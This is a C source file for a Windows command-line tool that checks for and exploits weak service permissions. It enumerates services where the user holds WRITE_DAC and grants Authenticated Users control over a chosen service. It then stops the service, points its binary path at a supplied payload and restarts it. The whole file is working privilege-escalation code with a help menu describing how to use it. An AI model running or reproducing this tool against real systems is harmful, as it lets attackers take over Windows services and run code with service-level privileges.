#include <stdlib.h>
#include <stdio.h>
#include <Windows.h>
#include <winsvc.h>
#include <AccCtrl.h>
#include <AclAPI.h>

void help_menu(wchar_t * argv[])
{
	printf("Help menu:\n");
	printf("Check for writedac:\n");
	wprintf(L"%s check\n", argv[0]);
	printf("Write dacl to service:\n");
	wprintf(L"%s write <service> [Username/GroupName]\n", argv[0]);
	printf("Start service:\n");
	wprintf(L"%s start <service>\n", argv[0]);
	printf("Stop service:\n");
	wprintf(L"%s stop <service>\n", argv[0]);
	printf("Change binary path for service:\n");
	wprintf(L"%s changebinary <service> <payload>\n", argv[0]);
	printf("Auto exploit service:\n");
	wprintf(L"%s exploit <service name> <payload> [Username/GroupName]\n", argv[0]);
	printf("Exploit will change the Authenticated Users group DACL permissions by default, you can specify another SID to modify or add, it will stop the service, modify the binary path, and start the service.\n");
	printf("Exploit will not stop any dependent services. Use the stop command to stop the dependant services.\n");
	printf("If you intend to change a dacl for a user or group, be absolutely sure the user/group exits and is spelled correctly. Otherwise, the DACLs for the service will be completely removed with no dacls remaining.\n");
	exit(1);
}

void winapi_error()
{
	wchar_t buff[4096];
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buff, sizeof(buff), NULL);
	wprintf(L"ERROR: %s\n", buff);
	exit(1);
}

int wmain(int argc, wchar_t * argv[])
{
	if (argc < 2)
	{
		printf("No options specified!\n");
		help_menu(argv);
	}
	SC_HANDLE scmanager = OpenSCManager(NULL, NULL, GENERIC_READ);
	if (scmanager == NULL)
	{
		printf("Could not acquire handle to SCManger!\n");
		exit(1);
	}
	if (wcsncmp(argv[1], L"check", 5) == 0)
	{
		bool status;
		DWORD bytesneeded = 0;
		DWORD servicescount = 0;
		DWORD resumehandle = 0;
		status = EnumServicesStatusEx(scmanager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesneeded, &servicescount, &resumehandle, NULL);
		LPBYTE servicesname = (LPBYTE)malloc(1024*256);
		status = EnumServicesStatusEx(scmanager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, servicesname, 1024*256, &bytesneeded, &servicescount, &resumehandle, NULL);
		if (status != 0)
		{
			int i = 0;
			for (i = 0; i < servicescount; i++)
			{
				_ENUM_SERVICE_STATUS_PROCESSW currentservice;
				memcpy(&currentservice, servicesname + (i * sizeof(_ENUM_SERVICE_STATUS_PROCESSW)), sizeof(_ENUM_SERVICE_STATUS_PROCESSW));
				SC_HANDLE currentservicehandle = OpenServiceW(scmanager, currentservice.lpServiceName, READ_CONTROL|WRITE_DAC);
				if (currentservicehandle != NULL)
				{
					//check for dependent services
					LPENUM_SERVICE_STATUS dependencies = NULL;
					ENUM_SERVICE_STATUS ess;
					SC_HANDLE dependservicehandle;
					DWORD dependbytesneeded;
					DWORD dependcount;
					CloseServiceHandle(currentservicehandle);
					currentservicehandle = OpenService(scmanager, currentservice.lpServiceName, READ_CONTROL | SERVICE_ENUMERATE_DEPENDENTS);
					if (currentservicehandle == NULL)
					{
						wprintf(L"Service %s has WRITE_DAC but was unable to query for dependent services! Please manually verify no dependents before exploiting!\n", currentservice.lpServiceName);
						break;
					}
					if (EnumDependentServices(currentservicehandle, SERVICE_ACTIVE, dependencies, 0, &dependbytesneeded, &dependcount))
					{
						wprintf(L"Fully exploitable Service:%s\n", currentservice.lpServiceName);
					}
					else 
					{
						wprintf(L"Service has WRITE_DAC but has dependent services:%s\n", currentservice.lpServiceName);
						dependencies = (LPENUM_SERVICE_STATUS)malloc(256*1024);
						if (!dependencies)
						{
							printf("Malloc failed!\n");
							break;
						}
						if (!EnumDependentServices(currentservicehandle, SERVICE_ACTIVE, dependencies, 256*1024, &dependbytesneeded, &dependcount))
						{
							printf("Enumerating Dependent Services failed!\n");
							break;
						}
						int j;
						for (j = 0; j < dependcount; j++)
						{
							ess = *(dependencies + j);
							wprintf(L"Dependent Service: %s\n", ess.lpServiceName);
							dependservicehandle = OpenService(scmanager, ess.lpServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
							if (dependservicehandle == NULL)
							{
								wprintf(L"Do not have privilege to stop service %s!\n", ess.lpServiceName);
							}
							else
							{
								wprintf(L"Do have privilege to stop service %s!\n", ess.lpServiceName);
								CloseServiceHandle(dependservicehandle);
								break;
							}
							dependservicehandle = OpenService(scmanager, ess.lpServiceName, WRITE_DAC | SERVICE_QUERY_STATUS);
							if (dependservicehandle == NULL)
							{
								wprintf(L"Do not have WRITE_DAC privilege to service %s!\n", ess.lpServiceName);
							}
							else
							{
								wprintf(L"Do have WRITE_DAC privilege to service %s!\n", ess.lpServiceName);
								CloseServiceHandle(dependservicehandle);
								break;
							}
							dependservicehandle = OpenService(scmanager, ess.lpServiceName, SERVICE_QUERY_STATUS);
							if(dependservicehandle == NULL)
							{
								wprintf(L"Do not have privilege to view status of service %s!\n", ess.lpServiceName);
								wprintf(L"Service %s will not be able to be fully exploited until computer can restart, however dependent services may become defunct if exploited!\n", currentservice.lpServiceName);
								break;
							}
							SERVICE_STATUS_PROCESS ssp;
							DWORD bytesneeded;
							if (!QueryServiceStatusEx(dependservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
							{
								wprintf(L"Could not query state of service %s!\n", ess.lpServiceName);
								CloseServiceHandle(dependservicehandle);
								break;
							}
							if (ssp.dwCurrentState == SERVICE_STOPPED)
							{
								wprintf(L"Service %s is currently stopped!\n", ess.lpServiceName);
								CloseServiceHandle(dependservicehandle);
								break;
							}
							else if (ssp.dwCurrentState == SERVICE_STOP_PENDING)
							{
								wprintf(L"Service %s has a stop pending! Checking again in 30 seconds!\n", ess.lpServiceName);
								Sleep(30000);
								if (!QueryServiceStatusEx(dependservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
								{
									wprintf(L"Could not query state of service %s!\n", ess.lpServiceName);
									CloseServiceHandle(dependservicehandle);
									break;
								}
								if (ssp.dwCurrentState == SERVICE_STOPPED)
								{
									wprintf(L"Service %s is currently stopped!\n", ess.lpServiceName);
									CloseServiceHandle(dependservicehandle);
									break;
								}
								else
								{
									printf("Service stop timed out!\n");
									CloseServiceHandle(dependservicehandle);
									break;
								}
							}
						}
					}
					CloseServiceHandle(currentservicehandle);
				}
			}
		}
		else
		{
			printf("Service Query failed!\n");
			winapi_error();
		}
		free(servicesname);
		CloseServiceHandle(scmanager);
	}
	else if (wcsncmp(argv[1], L"exploit", 7) == 0)
	{
		if (argc < 4)
		{
			help_menu(argv);
		}
		DWORD daclbytesneeded = 0;
		DWORD finalsize = 0;
		PSECURITY_DESCRIPTOR psd = NULL;
		BOOL daclpresent = false;
		PACL pacl = NULL;
		BOOL dacldefault = false;
		EXPLICIT_ACCESS ea;
		PACL newpacl = NULL;
		wchar_t username[1024];
		memset(username, 0, 1024);
		DWORD dwerror = 0 ;
		SECURITY_DESCRIPTOR sd;
		SC_HANDLE exploitservicehandle = OpenServiceW(scmanager, argv[2], READ_CONTROL | WRITE_DAC | GENERIC_READ);
		if (exploitservicehandle == NULL)
		{
			wprintf(L"Unable to aquire handle to %s! We dont have write_dac rights to that service!\n", argv[2]);
			winapi_error();
		}
		
		if (!QueryServiceObjectSecurity(exploitservicehandle, DACL_SECURITY_INFORMATION, &psd, 0, &daclbytesneeded))
		{
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				finalsize = daclbytesneeded;
				psd = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, finalsize);
				if (psd == NULL)
				{
					printf("Malloc failed!\n");
					winapi_error();
				}
				if (!QueryServiceObjectSecurity(exploitservicehandle, DACL_SECURITY_INFORMATION, psd, finalsize, &daclbytesneeded))
				{
					printf("%d\n", GetLastError());
					wprintf(L"Error getting security information from %s!\n", argv[2]);
					free(psd);
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					winapi_error();
				}
			}
		}
		if (!GetSecurityDescriptorDacl(psd, &daclpresent, &pacl, &dacldefault))
		{
			printf("%d\n", GetLastError());
			free(psd);
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			wprintf(L"Error getting dacl information from %s!\n", argv[2]);
			winapi_error();
		}
		if (argc == 4)
		{
			mbstowcs(username, "Authenticated Users", 1024);
		}
		else
		{
			wcsncpy(username, argv[4], 1024);
		}
		BuildExplicitAccessWithName(&ea, username, SERVICE_START|SERVICE_STOP|SERVICE_CHANGE_CONFIG|SERVICE_QUERY_CONFIG| SERVICE_QUERY_STATUS | WRITE_DAC, SET_ACCESS, NO_INHERITANCE);
		dwerror = SetEntriesInAcl(1, &ea, pacl, &newpacl);
		
		if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
		{
			free(psd);
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Security Descriptor Initialized failed!\n");
			winapi_error();
		}
		if (!SetSecurityDescriptorDacl(&sd, TRUE, newpacl, FALSE))
		{
			free(psd);
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Set Security Descriptor failed!\n");
			winapi_error();
		}
		if (!SetServiceObjectSecurity(exploitservicehandle, DACL_SECURITY_INFORMATION, &sd))
		{
			free(psd);
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Modifying dacl security information failed!\n");
			winapi_error();
		}
		CloseServiceHandle(exploitservicehandle);
		free(psd);
		printf("Modified Dacls for service! Attempting to exploit!\n");
		exploitservicehandle = OpenService(scmanager, argv[2], READ_CONTROL | SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS);
		SERVICE_STATUS_PROCESS ssp;
		DWORD bytesneeded;
		if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
		{
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Could not query service for status!\n");
			winapi_error();
		}
		if (ssp.dwCurrentState == SERVICE_STOPPED)
		{

		}
		else if (ssp.dwCurrentState == SERVICE_STOP_PENDING)
		{
			int count = 0;
			while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
			{
				Sleep(10000);
				if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
				{
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					printf("Could not query service for status!\n");
					winapi_error();
				}
				if (ssp.dwCurrentState == SERVICE_STOPPED)
				{
					break;
				}
				count++;
				if (count > 3)
				{
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					printf("Service stop timed out!\n");
					exit(1);
				}
			}
		}
		else
		{
			if (!ControlService(exploitservicehandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
			{
				printf("Failed to send stop control to service!\n");
				CloseServiceHandle(exploitservicehandle);
				CloseServiceHandle(scmanager);
				winapi_error();
			}
			int count = 0;
			while (ssp.dwCurrentState != SERVICE_STOPPED)
			{
				Sleep(10000);
				if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
				{
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					printf("Could not query service for status!\n");
					winapi_error();
				}
				if (ssp.dwCurrentState == SERVICE_STOPPED)
				{
					break;
				}
				count++;
				if (count > 3)
				{
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					printf("Service stop timed out!\n");
					exit(1);
				}
			}
		}
		wprintf(L"Service stopped!");
		if (!ChangeServiceConfig(exploitservicehandle, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, argv[3], NULL, NULL, NULL, NULL, NULL, NULL))
		{
			printf("Failed to change binary path!\n");
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			exit(1);
		}
		printf("Changed binary path!\n");
		if (!StartService(exploitservicehandle, 0, NULL))
		{
			printf("Failed to start service!\n");
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			exit(1);
		}
		if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
		{
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Could not query service for status!\n");
			winapi_error();
		}
		int count = 0;
		while (ssp.dwCurrentState == SERVICE_START_PENDING)
		{
			Sleep(10000);
			if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
			{
				CloseServiceHandle(exploitservicehandle);
				CloseServiceHandle(scmanager);
				printf("Could not query service for status!\n");
				winapi_error();
			}
			if (ssp.dwCurrentState == SERVICE_RUNNING)
			{
				break;
			}
			count++;
			if (count > 6)
			{
				CloseServiceHandle(exploitservicehandle);
				CloseServiceHandle(scmanager);
				printf("Service start timed out!\n");
				exit(1);
			}
		}
		printf("Exploit Complete!\n");
		CloseServiceHandle(exploitservicehandle);
		CloseServiceHandle(scmanager);
	}
	else if (wcsncmp(argv[1], L"write", 5) == 0)
	{
		if (argc < 3)
		{
			help_menu(argv);
		}
		DWORD daclbytesneeded = 0;
		DWORD finalsize = 0;
		PSECURITY_DESCRIPTOR psd = NULL;
		BOOL daclpresent = false;
		PACL pacl = NULL;
		BOOL dacldefault = false;
		EXPLICIT_ACCESS ea;
		PACL newpacl = NULL;
		wchar_t username[1024];
		memset(username, 0, 1024);
		DWORD dwerror = 0;
		SECURITY_DESCRIPTOR sd;
		SC_HANDLE exploitservicehandle = OpenServiceW(scmanager, argv[2], READ_CONTROL | WRITE_DAC | GENERIC_READ);
		if (exploitservicehandle == NULL)
		{
			wprintf(L"Unable to aquire handle to %s! We dont have write_dac rights to that service!\n", argv[2]);
			winapi_error();
		}

		if (!QueryServiceObjectSecurity(exploitservicehandle, DACL_SECURITY_INFORMATION, &psd, 0, &daclbytesneeded))
		{
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				finalsize = daclbytesneeded;
				psd = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, finalsize);
				if (psd == NULL)
				{
					printf("Malloc failed!\n");
					winapi_error();
				}
				if (!QueryServiceObjectSecurity(exploitservicehandle, DACL_SECURITY_INFORMATION, psd, finalsize, &daclbytesneeded))
				{
					printf("%d\n", GetLastError());
					wprintf(L"Error getting security information from %s!\n", argv[2]);
					free(psd);
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					winapi_error();
				}
			}
		}
		if (!GetSecurityDescriptorDacl(psd, &daclpresent, &pacl, &dacldefault))
		{
			printf("%d\n", GetLastError());
			free(psd);
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			wprintf(L"Error getting dacl information from %s!\n", argv[2]);
			winapi_error();
		}
		if (argc == 3)
		{
			mbstowcs(username, "Authenticated Users", 1024);
		}
		else
		{
			wcsncpy(username, argv[3], 1024);
		}
		BuildExplicitAccessWithName(&ea, username, SERVICE_START | SERVICE_STOP | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS | WRITE_DAC, SET_ACCESS, NO_INHERITANCE);
		dwerror = SetEntriesInAcl(1, &ea, pacl, &newpacl);

		if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
		{
			free(psd);
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Security Descriptor Initialized failed!\n");
			winapi_error();
		}
		if (!SetSecurityDescriptorDacl(&sd, TRUE, newpacl, FALSE))
		{
			free(psd);
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Set Security Descriptor failed!\n");
			winapi_error();
		}
		if (!SetServiceObjectSecurity(exploitservicehandle, DACL_SECURITY_INFORMATION, &sd))
		{
			free(psd);
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Modifying dacl security information failed!\n");
			winapi_error();
		}
		CloseServiceHandle(exploitservicehandle);
		free(psd);
		printf("Modified Dacls for service!");
	}
	else if (wcsncmp(argv[1], L"start", 5) == 0)
	{
		if (argc < 3)
		{
			help_menu(argv);
		}
		SC_HANDLE exploitservicehandle = OpenServiceW(scmanager, argv[2], READ_CONTROL | SERVICE_START | SERVICE_QUERY_STATUS);
		if (exploitservicehandle == NULL)
		{
			wprintf(L"Unable to aquire handle to %s! We dont have write_dac rights to that service!\n", argv[2]);
			winapi_error();
		}
		SERVICE_STATUS_PROCESS ssp;
		DWORD bytesneeded;
		if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
		{
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Could not query service for status!\n");
			winapi_error();
		}
		if (ssp.dwCurrentState != SERVICE_STOPPED && ssp.dwCurrentState != SERVICE_STOP_PENDING)
		{
			printf("Cannot start service as it is already running!\n");
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			exit(1);
		}
		if (!StartService(exploitservicehandle, 0, NULL))
		{
			printf("Failed to start service!\n");
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			winapi_error();
		}
		if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
		{
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Could not query service for status!\n");
			winapi_error();
		}
		int count = 0;
		while (ssp.dwCurrentState == SERVICE_START_PENDING)
		{
			Sleep(10000);
			if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
			{
				CloseServiceHandle(exploitservicehandle);
				CloseServiceHandle(scmanager);
				printf("Could not query service for status!\n");
				winapi_error();
			}
			if (ssp.dwCurrentState == SERVICE_RUNNING)
			{
				break;
			}
			count++;
			if (count > 6)
			{
				CloseServiceHandle(exploitservicehandle);
				CloseServiceHandle(scmanager);
				printf("Service start timed out!\n");
				exit(1);
			}
		}
		printf("Service Started!\n");
	}
	else if (wcsncmp(argv[1], L"stop", 4) == 0)
	{
		if (argc < 3)
		{
			help_menu(argv);
		}
		SC_HANDLE exploitservicehandle = OpenServiceW(scmanager, argv[2], READ_CONTROL | SERVICE_STOP | SERVICE_QUERY_STATUS);
		if (exploitservicehandle == NULL)
		{
			wprintf(L"Unable to aquire handle to %s! We dont have write_dac rights to that service!\n", argv[2]);
			winapi_error();
		}
		SERVICE_STATUS_PROCESS ssp;
		DWORD bytesneeded;
		if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
		{
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			printf("Could not query service for status!\n");
			winapi_error();
		}
		if (ssp.dwCurrentState == SERVICE_STOPPED)
		{

		}
		else if (ssp.dwCurrentState == SERVICE_STOP_PENDING)
		{
			int count = 0;
			while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
			{
				Sleep(10000);
				if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
				{
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					printf("Could not query service for status!\n");
					winapi_error();
				}
				if (ssp.dwCurrentState == SERVICE_STOPPED)
				{
					break;
				}
				count++;
				if (count > 3)
				{
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					printf("Service stop timed out!\n");
					exit(1);
				}
			}
		}
		else
		{
			if (!ControlService(exploitservicehandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
			{
				printf("Failed to send stop control to service!\n");
				CloseServiceHandle(exploitservicehandle);
				CloseServiceHandle(scmanager);
				winapi_error();
			}
			int count = 0;
			while (ssp.dwCurrentState != SERVICE_STOPPED)
			{
				Sleep(10000);
				if (!QueryServiceStatusEx(exploitservicehandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesneeded))
				{
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					printf("Could not query service for status!\n");
					winapi_error();
				}
				if (ssp.dwCurrentState == SERVICE_STOPPED)
				{
					break;
				}
				count++;
				if (count > 3)
				{
					CloseServiceHandle(exploitservicehandle);
					CloseServiceHandle(scmanager);
					printf("Service stop timed out!\n");
					exit(1);
				}
			}
		}
		wprintf(L"Service stopped!");
	}
	else if (wcsncmp(argv[1], L"changebinary", 12) == 0)
	{
		if (argc < 4)
		{
			help_menu(argv);
		}
		SC_HANDLE exploitservicehandle = OpenServiceW(scmanager, argv[2], READ_CONTROL | SERVICE_CHANGE_CONFIG);
		if (exploitservicehandle == NULL)
		{
			wprintf(L"Unable to aquire handle to %s! We dont have write_dac rights to that service!\n", argv[2]);
			winapi_error();
		}
		if (!ChangeServiceConfig(exploitservicehandle, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, argv[3], NULL, NULL, NULL, NULL, NULL, NULL))
		{
			printf("Failed to change binary path!\n");
			CloseServiceHandle(exploitservicehandle);
			CloseServiceHandle(scmanager);
			exit(1);
		}
		printf("Changed binary path!\n");
	}
	else 
	{
		help_menu(argv);
	}
	exit(0);
}